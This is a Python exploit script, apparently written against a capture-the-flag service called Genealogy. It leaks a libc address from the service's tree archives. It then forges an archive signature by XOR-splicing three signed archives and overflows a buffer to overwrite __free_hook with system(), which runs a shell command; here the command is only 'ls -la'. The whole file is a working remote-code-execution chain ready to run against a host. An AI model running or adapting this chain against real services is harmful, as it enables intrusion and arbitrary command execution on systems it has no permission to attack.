#!/usr/bin/env python3
import asyncio
import itertools
import random
import string
import sys
from typing import Iterable

from pwn import ELF

from client import GenealogyClient

PORT = 8888
AES_BLOCK_SIZE = 16
PAYLOAD = b"/bin/sh -c 'ls -la'"


def generate_random_string(length: int = 10, alphabet: str = string.ascii_lowercase):
    return "".join(random.sample(alphabet, length))


async def get_libc_address(endpoint: str):
    login = generate_random_string()
    password = generate_random_string()

    async with GenealogyClient(endpoint) as client:
        await client.create_user(login, password)
        await client.login(login, password)
        await client.create_tree("title", "description")

        parent_id = await client.create_person("", 0, 0, None, None)
        person_id = await client.create_person("", 0, 0, parent_id, None)
        await client.update_tree("title", "description", person_id)

        archive = await client.download_tree_archive()
        parsed_archive = await client.check_tree_archive(archive)
        leaked_address = parsed_archive["tree"]["person"]["parents"][0]["birth_date"]
        print("Leaked address:", hex(leaked_address))

    # Main Arena offset can be obtained with https://github.com/bash-c/main_arena_offset
    # $ ./main_arena libc-2.31.so
    # [+]libc version : glibc 2.31
    # [+]build ID : BuildID[sha1]=54eef5ce96cf37cb175b0d93186836ca1caf470c
    # [+]main_arena_offset : 0x1beb80
    main_arena_offset = 0x1beb80
    main_arena_element_offset = 0x60  # because of size of our chunks
    libc_address = leaked_address - main_arena_offset - main_arena_element_offset
    print("Libc base address:", hex(libc_address))
    return libc_address


def extract_archive_and_signature(data: bytes) -> tuple[bytes, bytes]:
    return data[:-AES_BLOCK_SIZE], data[-AES_BLOCK_SIZE:]


def get_length_and_padding_for(data: bytes) -> bytes:
    length = len(data) + 2
    padded_length = (length + AES_BLOCK_SIZE) // AES_BLOCK_SIZE * AES_BLOCK_SIZE
    return bytes([len(data) // 256, len(data) % 256] + [padded_length - length] * (padded_length - length))


def print_bytes_hex(data: bytes, row_length: int = 64):
    for idx, byte in enumerate(data):
        print("%02x " % byte, end="")
        if (idx + 1) % row_length == 0:
            print()
    if len(data) % row_length != 0:
        print()


def bytes_to_number(data: bytes) -> int:
    assert len(data) <= 8
    result = 0
    for byte in reversed(data):
        result = result * 256 + byte
    return result


def generate_payload(total_length: int) -> list[int]:
    result = []
    for idx in range(0, len(PAYLOAD), 8):
        result.append(bytes_to_number(PAYLOAD[idx:idx + 8]))
    return result + list(range(1, total_length - len(result) + 1))


async def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
    login = generate_random_string()
    password = generate_random_string()

    description_length = 0x257 - 160  # 0x257 is desired total length, 160 is a total size of other fields

    async with GenealogyClient(endpoint) as client:
        user_id = await client.create_user(login, password)
        await client.login(login, password)
        # Put enough chunks to tcache (2 will be enough)
        grandparent = await client.create_person("", 1, None, None, None)
        parent = await client.create_person("", 1, None, grandparent, None)
        root = await client.create_person("", 1, None, parent, None)
        await client.create_tree("", "x" * description_length, root)

        payload = generate_payload(60)  # 60 is max size of owners list
        await client.update_owners(payload)

        archive_with_signature = await client.download_tree_archive()

    archive, signature = extract_archive_and_signature(archive_with_signature)
    return user_id, archive, signature


async def generate_second_archive(endpoint: str, user_id_length: int, total_length: int) -> tuple[str, str, bytes, bytes]:
    login = generate_random_string()
    password = generate_random_string()

    # 1 byte for id's field number,
    # 3 bytes for title's field number and length (length is large enough to occupy 2 bytes)
    title_length = total_length - user_id_length - 1 - 3
    title = "x" * title_length

    async with GenealogyClient(endpoint) as client:
        await client.create_user(login, password)
        await client.login(login, password)
        await client.create_tree(title, "")

        archive_with_signature = await client.download_tree_archive()

    archive, signature = extract_archive_and_signature(archive_with_signature)
    return login, password, archive, signature


async def generate_third_archive(endpoint: str, login: str, password: str, description: str, free_hook_address: int, system_address: int):
    async with GenealogyClient(endpoint) as client:
        await client.login(login, password)
        tree = await client.get_tree()

        await client.update_owners([0, 0x1f1, free_hook_address])

        a = await client.create_person("", 0, None, None, None)
        b = await client.create_person("", 0, None, None, None)
        c = await client.create_person("", system_address, None, a, b)
        d = await client.create_person("", 0, None, None, None)
        e = await client.create_person("", 0, None, c, d)
        f = await client.create_person("", 0, None, None, None)
        g = await client.create_person("", 0, None, e, f)

        await client.update_tree(tree["title"], description, g)

        archive_with_signature = await client.download_tree_archive()

    archive, signature = extract_archive_and_signature(archive_with_signature)
    return archive, signature


def xor(array1: Iterable, array2: Iterable) -> Iterable:
    for x1, x2 in itertools.zip_longest(array1, array2, fillvalue=0):
        yield x1 ^ x2


async def rce(endpoint: str, libc_address: int):
    # libc-2.31.so is extracted from the docker image (gcc:11-bullseye)
    # If it will change in future, just replace file here.
    libc = ELF("./libc-2.31.so")
    libc.address = libc_address

    user_id, archive1, signature1 = await generate_first_archive(endpoint)
    print("Archive for user 1:")
    print_bytes_hex(archive1)
    print("Was padded by:", end=" ")
    length_and_padding1 = get_length_and_padding_for(archive1)
    print_bytes_hex(length_and_padding1)
    print("Signature for user 1:", end=" ")
    print_bytes_hex(signature1)

    login2, password2, archive2, signature2 = await generate_second_archive(endpoint, 1 if user_id < 127 else 2, len(archive1))
    print("Archive for user 2:")
    print_bytes_hex(archive2)
    print("Was padded by:", end=" ")
    length_and_padding2 = get_length_and_padding_for(archive2)
    print_bytes_hex(length_and_padding2)
    print("Signature for user 2:", end=" ")
    print_bytes_hex(signature2)

    assert(length_and_padding1 == length_and_padding2)

    padding_length = len(length_and_padding1) - 2
    description = length_and_padding1[2:].decode() + "x" * (length_and_padding1[1] - padding_length)
    archive3, signature3 = await generate_third_archive(endpoint, login2, password2, description, libc.symbols["__free_hook"], libc.symbols["system"])
    print("Archive for user 3:")
    print_bytes_hex(archive3)
    print("Was padded by:", end=" ")
    length_and_padding3 = get_length_and_padding_for(archive3)
    print_bytes_hex(length_and_padding3)
    print("Signature for user 3:", end=" ")
    print_bytes_hex(signature3)

    suffix = archive3[len(archive1) + len(length_and_padding1):]
    hacked_archive = archive1 + length_and_padding1 + bytes(xor(xor(signature1, signature2), suffix)) + signature3
    print("Hacked archive with buffer overflow:")
    print_bytes_hex(hacked_archive)
    async with GenealogyClient(endpoint) as client:
        await client.login(login2, password2)
        await client.check_tree_archive(hacked_archive)


async def temp(endpoint):
    async with GenealogyClient(endpoint) as client:
        archive = [
            0x00, 0x7e, 0x02, 0x8e, 0x03, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
            0x78, 0x03, 0xaf, 0xc4, 0xa5, 0xf3, 0xf6, 0xe5, 0x9c, 0xb4, 0x20, 0x03, 0xad, 0xc6, 0x81, 0xe1, 0xb6, 0x8e,
            0xc8, 0x96, 0x6c, 0x03, 0x01, 0x03, 0x02, 0x03, 0x03, 0x03, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x07, 0x03,
            0x08, 0x03, 0x09, 0x03, 0x0a, 0x03, 0x0b, 0x03, 0x0c, 0x03,
            0x0d, 0x03, 0x0e, 0x03, 0x0f, 0x03, 0x10, 0x03, 0x11, 0x03, 0x12, 0x03, 0x13, 0x03, 0x14, 0x03, 0x15, 0x03,
            0x16, 0x03, 0x17, 0x03, 0x18, 0x03, 0x19, 0x03, 0x1a, 0x03, 0x1b, 0x03, 0x1c, 0x03, 0x1d, 0x03, 0x1e, 0x03,
            0x1f, 0x03, 0x20, 0x03, 0x21, 0x03, 0x22, 0x03, 0x23, 0x03, 0x24, 0x03, 0x25, 0x03, 0x26, 0x03, 0x27, 0x03,
            0x28, 0x03, 0x29, 0x03, 0x2a, 0x03, 0x2b, 0x03, 0x2c, 0x03,
            0x2d, 0x03, 0x2e, 0x03, 0x2f, 0x03, 0x30, 0x03, 0x31, 0x03, 0x32, 0x03, 0x33, 0x03, 0x34, 0x03, 0x35, 0x03,
            0x36, 0x03, 0x37, 0x03, 0x38, 0x03, 0x39, 0x03, 0x3a, 0x04, 0x0a, 0x00, 0x01, 0x01, 0x01, 0x03, 0x04, 0x00,
            0x01, 0x01, 0x01, 0x02, 0x27, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x18, 0x58, 0x37, 0x6e, 0x96, 0x85,
            0x3e, 0xd5, 0x2f, 0xcb, 0x5f, 0x99, 0x32, 0x80, 0xc0, 0xae,
            0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x03, 0x00,
            0x03, 0xf1, 0x03, 0x03, 0xf0, 0xbc, 0x8e, 0xca, 0x8c, 0xee, 0x1f, 0x04, 0x22, 0x01, 0x01, 0x03, 0x1a, 0x01,
            0x01, 0x03, 0x12, 0x00, 0xd0, 0x9c, 0xb0, 0xc9, 0x8c, 0xee, 0x1f, 0x01, 0x01, 0x03, 0x02, 0x01, 0x01, 0x03,
            0x02, 0x01, 0x01, 0x03, 0x02, 0x01, 0x01, 0x03, 0x02, 0x01,
            0x01, 0x9a, 0xe1, 0x8a, 0xd4, 0x5d, 0x4c, 0x55, 0x18, 0x22, 0x27, 0x40, 0xda, 0x65, 0x25, 0x62, 0xda,
        ]
        await client.check_tree_archive(bytes(archive))


async def main(endpoint: str):
    libc_address = await get_libc_address(endpoint)
    await rce(endpoint, libc_address)
    # await temp(endpoint)

if __name__ == "__main__":
    address = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    endpoint = f"http://{address}:{PORT}/"
    asyncio.run(main(endpoint))
